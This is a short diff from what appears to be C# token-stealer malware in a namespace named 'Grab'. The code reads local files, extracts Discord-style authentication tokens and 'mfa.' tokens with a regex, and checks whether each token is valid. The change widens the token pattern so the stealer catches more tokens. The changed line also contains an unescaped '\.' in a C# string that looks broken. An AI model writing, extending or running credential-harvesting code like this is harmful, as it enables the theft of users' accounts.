@@ -47,7 +47,7 @@ namespace Grab {
                     if (file.Equals("LOCK")) continue;
                     try {
                         var data = file.OpenText().ReadToEnd();
-                        foreach (Match match in Regex.Matches(data, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")) {
+                        foreach (Match match in Regex.Matches(data, "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27,}|mfa\\.[\\w-]{84}")) {
                             if (token.Contains(match.Value)) continue;
                             var info = TokenUtil.checkToken(match.Value);
                             if (info.vaild) {
